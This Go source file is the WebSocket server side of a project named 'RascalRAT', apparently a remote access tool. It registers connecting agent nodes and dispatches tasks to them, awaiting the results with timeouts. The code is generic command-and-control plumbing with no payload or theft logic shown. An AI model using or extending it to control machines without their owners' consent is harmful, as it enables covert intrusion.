package ws

import (
	"context"
	"errors"
	"net/http"
	"time"

	"log/slog"

	"github.com/coder/websocket"
	"github.com/its-ernest/RascalRAT/internal/protocol"
	"github.com/labstack/echo/v5"
)

func AcceptAgentWebSocket(c *echo.Context, hub *Hub) error {
	r := c.Request()

	nodeID := r.Header.Get("X-Node-ID")
	if nodeID == "" {
		nodeID = r.URL.Query().Get("id")
	}
	if nodeID == "" {
		return c.String(http.StatusBadRequest, "Missing node identity declaration")
	}

	options := &websocket.AcceptOptions{
		OriginPatterns:  []string{"localhost:*", "127.0.0.1:*"},
		CompressionMode: websocket.CompressionContextTakeover,
	}

	wsConn, err := websocket.Accept(c.Response(), r, options)
	if err != nil {
		slog.Error("failed to upgrade connection to websocket", "err", err)
		return err
	}
	wsConn.SetReadLimit(4 << 20)

	session := hub.Register(nodeID, wsConn)
	slog.Info("new node connection established via websocket", "node_id", nodeID, "remote", r.RemoteAddr)
	session.Start(hub)

	return nil
}

func DispatchTask(c *echo.Context, hub *Hub) error {
	nodeID, err := echo.PathParam[string](c, "id")
	if err != nil {
		return c.JSON(http.StatusBadRequest, map[string]string{"error": "missing node target context"})
	}

	var req protocol.TaskRequest
	if err := c.Bind(&req); err != nil {
		return c.JSON(http.StatusBadRequest, map[string]string{"error": "malformed task request body"})
	}

	session, err := hub.GetSession(nodeID)
	if err != nil {
		return c.JSON(http.StatusNotFound, map[string]string{"error": err.Error()})
	}

	if req.TaskID == "" {
		return c.JSON(http.StatusBadRequest, map[string]string{"error": "task_id is required for execution tracking"})
	}

	respChan := make(chan protocol.TaskResponse, 1)
	session.RegisterTaskChan(req.TaskID, respChan)
	defer session.DeregisterTaskChan(req.TaskID)

	select {
	case session.Send <- req:
	default:
		slog.Warn("send queue saturated", "node_id", nodeID, "task_id", req.TaskID)
		return c.JSON(http.StatusServiceUnavailable, map[string]string{"error": "agent is currently busy"})
	}

	taskCtx, taskCancel := context.WithTimeout(c.Request().Context(), req.Timeout+2*time.Second)
	defer taskCancel()

	select {
	case response := <-respChan:
		return c.JSON(http.StatusOK, response)
	case <-taskCtx.Done():
		if errors.Is(taskCtx.Err(), context.DeadlineExceeded) {
			return c.JSON(http.StatusGatewayTimeout, map[string]string{"error": "endpoint task execution exceeded specified timeout thresholds"})
		}
		return c.JSON(http.StatusInternalServerError, map[string]string{"error": "request context cancelled during tracking"})
	}
}
